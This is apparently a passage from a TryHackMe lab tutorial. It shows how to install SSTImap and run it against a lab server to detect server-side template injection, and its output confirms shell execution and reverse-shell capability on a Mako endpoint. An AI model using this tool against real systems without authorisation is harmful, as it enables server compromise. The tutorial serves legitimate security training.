**SSTImap** is a tool that automates the process of testing and exploiting SSTI vulnerabilities in various template engines. Hosted on [GitHub](https://github.com/vladko312/SSTImap), it provides a framework for discovering template injection flaws.

1. **Clone the Repository**:
    ```bash
    git clone https://github.com/vladko312/SSTImap.git
    ```

2. **Navigate to the SSTImap Directory**:
    ```bash
    cd SSTImap
    ```

3. **Install Dependencies** (if any are listed, usually via a `requirements.txt`):
    ```bash
    pip install -r requirements.txt
    ```

SSTImap is capable of the following:
- **Template Engine Detection**: SSTImap can help identify the template engine used by a web application, which is crucial for crafting specific exploits.
- **Automated Exploitation**: For known vulnerabilities, SSTImap can automate the process of exploiting them.

You can use SSTImap by providing it with the target URL and any necessary options. Here’s a simple usage example:
```bash
python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
```

This command attempts to detect the SSTI vulnerability using tailored payloads.
```shell-session
user@tryhackme $ python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='           

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.2.1
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; generic: 3; engines: 17; legacy_engines: 2
[*] Loaded request body types: 4

[*] Scanning url: http://ssti.thm:8002/mako/
[*] Testing if Body parameter 'page' is injectable
[*] Mako plugin is testing rendering with tag '*'
[+] Mako plugin has confirmed injection with tag '*'
[+] SSTImap identified the following injection point:

  Body parameter: page
  Engine: Mako
  Injection: *
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, python code
```